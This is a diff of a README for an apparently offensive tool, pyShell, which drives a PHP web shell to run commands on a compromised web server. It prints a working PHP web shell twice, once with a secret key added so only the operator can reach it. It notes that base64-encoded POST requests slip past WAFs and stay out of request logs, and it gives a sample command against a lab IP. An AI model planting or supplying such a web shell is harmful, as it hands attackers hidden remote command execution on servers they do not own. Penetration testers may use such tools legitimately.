@@ -9,17 +9,38 @@ painful. The goal is to make it feel as much like an interactive shell as
 possible. Commands are base-64 encoded to help deal with WAFs, and are submitted
 as POST requests to be less visible in request logs.
 
-Usage is `python3 pyshell.py URL` where URL points to a script which performs
+Usage is `python3 pyshell.py URL [-k key]` where URL points to a script which performs
 the command injection, something like this:
 
 ```
-<?php $r=base64_decode($_POST['cmd']).' '.base64_decode($_POST['opts']); echo `$r` ?>
+<?php $key = ''; if (isset($_POST[$key.'cmd'])) { $r=base64_decode($_POST[$key.'cmd']).' '.base64_decode($_POST['opts']); echo `$r`} ?>
 ```
 
 The server-side script should accept the following parameters:
  - `cmd`: the command to be run, base64 encoded
  - `opts`: the options to provide to cmd, also base64 encoded
  - `[timeout]`: optional, denotes the number of seconds to wait for a command
+
+## Restricting access to the shell
+
+To restrict access to the shell put a value in `$key` and pass the value to 
+pyShell with `-k`:
+
+First generate a random key.  On GNU/Linux to generate a 32 byte (256 bit) key you can do this:
+```
+% dd if=/dev/urandom bs=1 count=32 2>/dev/null | base64 -w 0 | rev | cut -b 2- | rev
+G4ur5Mhxmb7ZsWt/h+OMDhzTDuLKEbrvmBlD0yoVslQ
+```
+
+Set `$key` to your random key:   
+```
+<?php $key = 'G4ur5Mhxmb7ZsWt/h+OMDhzTDuLKEbrvmBlD0yoVslQ'; if (isset($_POST[$key.'cmd'])) { $r=base64_decode($_POST[$key.'cmd']).' '.base64_decode($_POST['opts']); echo `$r`} ?>
+```
+
+Pass the key variable to PyShell:
+```
+% python3 pyshell.py http://192.168.56.101 -k G4ur5Mhxmb7ZsWt/h+OMDhzTDuLKEbrvmBlD0yoVslQ
+```
 
 ## USAGE DEMO:
 ![Screencast](pyshell-usage.gif)
